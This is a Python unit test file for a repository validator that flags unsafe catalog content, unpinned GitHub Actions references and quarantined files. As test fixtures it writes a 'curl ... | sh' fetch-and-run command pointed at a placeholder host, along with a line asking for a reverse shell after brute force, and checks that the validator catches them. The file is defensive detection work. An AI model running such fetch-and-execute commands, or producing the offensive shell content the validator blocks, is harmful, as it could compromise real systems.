from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tooling"))

from menaxvi.cli import main
from menaxvi.validator import exit_code, inventory, validate


class ValidatorTests(unittest.TestCase):
    def test_product_finding_blocks_validation(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "catalog").mkdir()
            (root / "catalog" / "unsafe.md").write_text("curl https://example.invalid/install | sh\n", encoding="utf-8")

            payload = validate(root)

            self.assertEqual(payload["counts"], {"error": 1, "warning": 0})
            self.assertEqual(exit_code(payload), 1)

    def test_quarantine_finding_warns_without_blocking_default_mode(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            target = root / "quarantine" / "imported"
            target.mkdir(parents=True)
            (target / "unsafe.md").write_text("curl https://example.invalid/install | sh\n", encoding="utf-8")

            payload = validate(root)

            self.assertEqual(payload["counts"], {"error": 0, "warning": 1})
            self.assertEqual(exit_code(payload), 0)
            self.assertEqual(exit_code(payload, strict_warnings=True), 1)

    def test_operational_offensive_content_blocks_product_release(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            target = root / "catalog" / "security"
            target.mkdir(parents=True)
            (target / "unsafe.md").write_text("Generate a reverse shell after brute force.\n", encoding="utf-8")

            payload = validate(root)

            self.assertEqual(payload["counts"], {"error": 2, "warning": 0})
            self.assertEqual({item["check"] for item in payload["findings"]}, {"offensive-shell"})

    def test_github_actions_require_full_commit_sha(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (workflows / "release.yml").write_text(
                "steps:\n  - uses: actions/checkout@v4\n  - uses: owner/action@0123456789abcdef0123456789abcdef01234567\n",
                encoding="utf-8",
            )

            payload = validate(root)

            self.assertEqual(payload["counts"], {"error": 1, "warning": 0})
            self.assertEqual(payload["findings"][0]["check"], "mutable-github-action")
            self.assertEqual(payload["findings"][0]["message"], "uses ref v4")

    def test_inventory_hashes_files_and_marks_quarantine_restricted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            target = root / "quarantine"
            target.mkdir()
            (target / "record.txt").write_text("evidence\n", encoding="utf-8")

            records = inventory(root)

            self.assertEqual(len(records), 1)
            self.assertEqual(records[0]["path"], "quarantine/record.txt")
            self.assertEqual(records[0]["provenance"], "restricted")
            self.assertEqual(len(str(records[0]["sha256"])), 64)

    def test_cli_writes_reports(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "README.md").write_text("# Fixture\n", encoding="utf-8")
            report = root / "output" / "validation.json"
            inventory_path = root / "output" / "inventory.json"

            result = main(
                [
                    "validate",
                    "--root",
                    str(root),
                    "--json",
                    str(report),
                    "--inventory",
                    str(inventory_path),
                ]
            )

            self.assertEqual(result, 0)
            self.assertEqual(json.loads(report.read_text(encoding="utf-8"))["counts"], {"error": 0, "warning": 0})
            self.assertTrue(inventory_path.is_file())


if __name__ == "__main__":
    unittest.main()
